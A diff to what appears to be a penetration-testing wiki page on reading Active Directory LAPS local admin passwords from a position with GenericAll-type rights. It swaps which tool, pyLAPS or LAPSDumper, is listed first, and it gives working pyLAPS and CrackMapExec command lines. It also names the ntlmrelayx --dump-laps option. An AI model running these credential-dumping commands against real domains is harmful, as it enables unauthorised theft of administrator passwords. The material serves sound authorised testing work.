@@ -4,10 +4,10 @@ This abuse can be carried out when controlling an object that has `GenericAll` o
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [LAPSDumper](https://github.com/n00py/LAPSDumper) (Python) can be used to retrieve LAPS passwords.
+From UNIX-like systems, [pyLAPS](https://github.com/p0dalirius/pyLAPS) (Python) can be used to retrieve LAPS passwords.
 
 ```bash
-laps.py --action get -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --dc-ip 192.168.56.101
+pyLAPS.py --action get -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --dc-ip 192.168.56.101
 ```
 
 Alternatively, [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) also has this ability (since v5.1.6).. In case it doesn't work [this public module](https://github.com/T3KX/Crackmapexec-LAPS) for CrackMapExec could also be used.
@@ -22,7 +22,7 @@ cme ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --module laps -O co
 
 Impacket's ntlmrelayx also carries that feature, usable with the `--dump-laps`.
 
-[pyLAPS](https://github.com/p0dalirius/pyLAPS) is another Python alternative.
+[LAPSDumper](https://github.com/n00py/LAPSDumper) is another Python alternative.
 {% endtab %}
 
 {% tab title="Windows" %}
